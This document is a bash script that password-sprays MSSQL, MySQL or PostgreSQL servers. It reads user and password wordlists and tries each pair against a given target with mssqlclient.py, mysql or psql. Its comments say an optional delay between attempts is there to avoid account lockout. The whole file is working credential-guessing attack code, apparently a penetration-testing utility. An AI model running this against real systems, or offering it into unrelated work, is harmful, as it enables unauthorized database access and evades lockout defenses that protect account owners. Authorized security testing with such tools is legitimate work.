#!/bin/bash

# Requires a users.txt and pass.txt wordlists
# This repository contains both wordlists with common database users/passwords

if [ "$1" == "" ]; then
    echo;echo "[>] Usage: $0 <target>"
    exit
fi

echo;read -p "[>] Database: [1] MSSQL [2] MySQL [3] PostgreSQL  -->  " db
read -p "[>] Seconds of delay between attempts (0 for no delay): " s
echo

# Password spraying logic to avoid, even further, an account lockout

if [[ $s ]] && [ $s -eq $s 2>/dev/null ] && [ "$s" != "" ]; then
	for p in $(cat pass.txt);do
		for u in $(cat users.txt);do
		    if [ "$db" == "1" ]; then
		    	echo $u:$p
				mssqlclient.py $u:$p@$1 2>/dev/null
				sleep $s
			elif [ "$db" == "2" ]; then
				echo $u:$p
				mysql -h $1 --user=$u --password=$p 2>/dev/null
				sleep $s
			elif [ "$db" == "3" ]; then
				echo $u:$p
				psql postgresql://$u:$p@$1 2>/dev/null
				sleep $s
			else
				echo "[!] Incorrect user input"
				exit
			fi
		done
	done
else
	echo "[!] Incorrect user input"
	exit
fi
